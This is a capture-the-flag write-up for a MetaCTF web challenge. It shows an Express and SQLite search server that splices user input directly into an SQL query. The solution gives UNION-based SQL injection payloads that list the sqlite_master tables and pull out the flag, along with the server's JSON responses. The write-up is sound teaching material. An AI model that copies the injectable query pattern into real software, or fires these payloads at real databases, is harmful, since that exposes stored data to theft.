# Yummy Vegetables

## Description

> I love me my vegetables, but I can never remember what color they are! I know lots of people have this problem, so I made a site to help.

```javascript
const express = require('express');
const Ajv = require('ajv');
const sqlite = require('better-sqlite3');

const sleep = (ms) => new Promise((res) => { setTimeout(res, ms) })

// set up express
const app = express();
app.use(express.json());
app.use(express.static('public'));

// ajv request validator
const ajv = new Ajv();
const schema = {
  type: 'object',
  properties: {
    query: { type: 'string' },
  },
  required: ['query'],
  additionalProperties: false
};
const validate = ajv.compile(schema);

// database
const db = sqlite('db.sqlite3');

// search route
app.search('/search', async (req, res) => {
  if (!validate(req.body)) {
    return res.json({
      success: false,
      msg: 'Invalid search query',
      results: [],
    });
  }

  await sleep(5000); // the database is slow :p

  const query = `SELECT * FROM veggies WHERE name LIKE '%${req.body.query}%';`;
  let results;
  try {
    results = db.prepare(query).all();
  } catch {
    return res.json({
      success: false,
      msg: 'Something went wrong :(',
      results: [],
    })
  }

  return res.json({
    success: true,
    msg: `${results.length} result(s)`,
    results,
  });
});

// start server
app.listen(3000, () => {
  console.log('Server started');
});
```

## Solution

The vulnerable line in the code is the following:

```javascript
const query = `SELECT * FROM veggies WHERE name LIKE '%${req.body.query}%';`;
```

The application is passing unsanitized user input into the SQL query directly!

From the source code, we know we are dealing with an SQLite database. In order to retrieve the table names, we inject the following UNION query.

```json
{
    "query":"%' and 0 UNION SELECT name, null, null FROM  sqlite_master WHERE type ='table' AND name NOT LIKE 'sqlite_%';--"
}
```

This shows us an additional table that contains the flag!

```json
{
    "success":true,
    "msg":"2 result(s)",
    "results":
    [
        {
            "id":"the_flag_is_in_here_730387f4b640c398a3d769a39f9cf9b5",
            "name":null,
            "color":null
        },
        {
            "id":"veggies",
            "name":null,
            "color":null
        }
    ]
}
```

From here, we can get the flag.

```json
{
    "query":"%' and 0 UNION SELECT flag, null, null FROM the_flag_is_in_here_730387f4b640c398a3d769a39f9cf9b5;--"
}
```

The flag is `MetaCTF{sql1t3_m4st3r_0r_just_gu3ss_g0d??}`.
